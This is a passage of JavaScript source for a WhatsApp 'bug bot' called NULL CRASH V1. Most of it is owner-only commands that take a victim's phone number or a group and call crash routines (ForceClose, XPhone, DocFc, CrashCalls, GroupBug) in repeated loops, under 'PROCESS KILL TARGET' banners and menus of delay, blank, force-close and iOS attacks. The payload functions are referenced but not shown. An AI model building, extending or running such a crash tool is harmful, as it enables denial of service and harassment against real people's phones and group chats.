        title: "N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1",
        body: "𝐋𝐎𝐑𝐃 𝐌𝐈𝐍𝐀𝐓𝐎 𝐃𝐄𝐕",
        mediaType: 1,
        thumbnailUrl: "https://files.catbox.moe/mks77q.jpg",
        sourceUrl: null,
      }
    },
    headerType: 4
  }, { quoted: bayzoffc });
}
break;

//============================
// 𝗖𝗔𝗦𝗘 𝗔𝗗𝗗 𝗣𝗥𝗘𝗠 | 𝗗𝗘𝗟 𝗣𝗥𝗘𝗠
//============================
case "addprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /addprem (number)");
let user = text.replace(/[^\d]/g, "");
addPremiumUser(user, 30);
m.reply(`✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖠𝖽𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 :\n• ${user} ( 30 days )`)}
break;
//======================
case "delprem": {
if (!isCreator) return m.reply(mess.owner);
if (!text) return m.reply("❌ Example: /delprem (number)");
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
m.reply(removed ? `✅ 𝖲𝗎𝖼𝖼𝖾𝗌𝖥𝗎𝗅𝗅𝗒 𝖱𝖾𝗆𝗈𝗏𝖾𝖽 𝖯𝗋𝖾𝗆𝗂𝗎𝗆 𝖴𝗌𝖾𝗋\n• ${user}` : "❌ User is not in premium list")}
break;
//==============================
// DELAY BUG 
//==============================

case "supreme-delay": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)
   

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break
 
 case "delay-super": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "😈", key: m.key } })
}
break

case "void-delay": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break
 
 case "delay-ultra": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👻", key: m.key } })
}
break

case "delayhard": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "💀", key: m.key } })
}
break
//==============================
// INVIS BUG 
//==============================

case "invis-bulldozer": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👹", key: m.key } })
}
break

case "invis-attack": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👹", key: m.key } })
}
break

case "invis-ultra": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👺", key: m.key } })
}
break

case "invis-combo": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👾", key: m.key } })
}
break

case "invis-dozer": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "💨", key: m.key } })
}
break

//==============================
// BLANK BUG 
//==============================

case "blank-ui": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🔥", key: m.key } })
}
break

case "blank-ghost": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "⚡", key: m.key } })
}
break

case "blank-new": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break


case "blank-super": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

case "blank-shoot": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

//==============================
// FORCECLOSE BUG 
//==============================

case "forceclose": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

case "fc-new": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

case "fc-infinity": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

case "fc-one": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break


case "fc-supreme": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await ForceClose(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
break

//==============================
// GROUP BUG 
//==============================

case 'xgroup': {
    if (!isCreator) return reply('*ONLY FOR GANG OF MINATO*!')
   
nato.sendMessage(m.chat, { react: { text: '👺', key: m.key } });
    
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await fcnew(target);
 await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break; 

case 'fc-gc': {
    if (!isCreator) return reply('*ONLY FOR GANG OF MINATO*!')
   
nato.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });
    
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await fcnew(target);
 await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break; 

case 'blank-gc': {
    if (!isCreator) return reply('*ONLY FOR GANG OF MINATO*!')
   
nato.sendMessage(m.chat, { react: { text: '😈', key: m.key } });
    
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await fcnew(target);
 await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break; 

case 'crash-gc': {
    if (!isCreator) return reply('*ONLY FOR GANG OF MINATO*!')
   
nato.sendMessage(m.chat, { react: { text: '💢', key: m.key } });
    
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await fcnew(target);
 await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break; 

case 'xcrash-gc': {
    if (!isCreator) return reply('*ONLY FOR GANG OF MINATO*!')
   
nato.sendMessage(m.chat, { react: { text: '💥', key: m.key } });
    
    
    //Paramater
    for (let r = 0; r < 100; r++) {
    await fcnew(target);
 await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
await GroupBug(m.chat);
    }
    await sleep(1000)
  console.log(chalk.red.bold("Success!"))
}
break; 

//==============================
// EMOJI BUG 
//==============================    

case "☠️": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
    for (let i = 0; i < 20; i++) {
    
await NativeCore(target);
await CrashCalls(target);
await DocFc(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
}
break

case "😑": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
    
    for (let i = 0; i < 25; i++) {
    
await DocFc(target);
await DocFc(target);
await DocFc(target);
await DocFc(target);
await DocFc(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
 }
break

case "🗿": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
    for (let i = 0; i < 50; i++) {
    
await NativeCore(target);
await NativeCore(target);
await NativeCore(target);
await NativeCore(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
 }
break

case "😠": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
    for (let i = 0; i < 35; i++) {
    
await CrashCalls(target);
await CrashCalls(target);
await CrashCalls(target);
await CrashCalls(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
 }
break


case "💥": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
      
      for (let i = 0; i < 55; i++) {
      
await NativeCore(target);
await DocFc(target);
await NativeCore(target);
await DocFc(target);
nato.sendMessage(from, { react: { text: "🥶", key: m.key } })
}
 }
break


//==============================
// IOS BUG 
//==============================

case "ios-combo": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break

case "ios-invasion": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break

case "attack-ios": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break

case "destroyer-ios": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break

case "ios-brutality": {
   if (!isCreator) return reply('*ONLY OWNER*')
   if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)

   let pepec = args[0].replace(/[^0-9]/g, "")
   let target = pepec + '@s.whatsapp.net'
   

   reply(`
 『 *PROCESS KILL TARGET* 』

𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}


© N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1`)

await doneress();
    
await Combo(target);
await fcnew(target);
await Combo(target);
await fcnew(target);
await XPhone(target);
nato.sendMessage(from, { react: { text: "👿", key: m.key } })
}
break



//==============================
// ANOTHER COMMANDS 
//==============================


case 'ht':
case 'hidetag': {
  if (!m.isGroup) return reply("*ONLY GROUP.*");
  if (!isCreator && !m.isAdmins) return reply("*Bot Is Not An Admin*");
  if (!text) return reply("*Format*:\nExample ht bug .");

  let teks = m.quoted ? m.quoted.text : text;
  let member = (await nato.groupMetadata(m.chat)).participants.map(e => e.id);
  await nato.sendMessage(m.chat, { text: teks, mentions: member });
}

        
case "cekidch": case "idch": {
if (!text) return reply("*PUT LINK*")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("*Link Is Not For Valid Channel*")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await nato.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Name :* ${res.name}
* *Total followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "YES" : "NO"}
`
return reply(teks)
}
break
//===============Bug menu commands=================\\
        
case 'delaybug': {
    await nato.sendMessage(from, { react: { text: "⌚", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *1.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭─「 𝐃𝐄𝐋𝐀𝐘 𝐁𝐔𝐆 」─╮
┃ ⤷ ᴅᴇʟᴀʏʜᴀʀᴅ
┃ ⤷ ᴅᴇʟᴀʏ-ᴜʟᴛʀᴀ
┃ ⤷ ᴠᴏɪᴅ-ᴅᴇʟᴀʏ
┃ ⤷ ᴅᴇʟᴀʏ-ꜱᴜᴘᴇʀ
┃ ⤷ ꜱᴜᴘʀᴇᴍᴇ-ᴅᴇʟᴀʏ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}

case 'blankbug': {
    await nato.sendMessage(from, { react: { text: "⬜", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *4.0.0*
┃ ⤷ ᴅᴇᴠ       : ᴄᴏᴅᴇʙʀᴇᴀᴋᴇʀ
╰━━━━━━━━━━━━━━━━━━━━━━━━╯
╭─「 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆 」─╮
┃ ⤷ ʙʟᴀɴᴋ-ꜱʜᴏᴏᴛ
┃ ⤷ ʙʟᴀɴᴋ-ꜱᴜᴘᴇʀ
┃ ⤷ ʙʟᴀɴᴋ-ɴᴇᴡ
┃ ⤷ ʙʟᴀɴᴋ-ɢʜᴏꜱᴛ
┃ ⤷ ʙʟᴀɴᴋ-ᴜɪ
╰──────────────────────╯
`;

    const imageUrl = "https://files.catbox.moe/a66dm5.jpg";

    await nato.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: BugmenuText,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363423407628679@newsletter',
                    newsletterName: 'N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1',
                    serverMessageId: 143
                }
            }
        },
        { quoted: bayzoffc }
    );
    break;
}
    
case 'invisbug': {
    await nato.sendMessage(from, { react: { text: "👻", key: m.key } });
   
    const BugmenuText = `
╭━ ❖ 「 N҉U҉L҉L҉ C҉R҉A҉S҉H҉ V҉1 」❖ ━━╮
┃ ⤷ ᴜsᴇʀ      : @${sender.split("@")[0]}
┃ ⤷ ᴠᴇʀsɪᴏɴ   : *4.0.0*
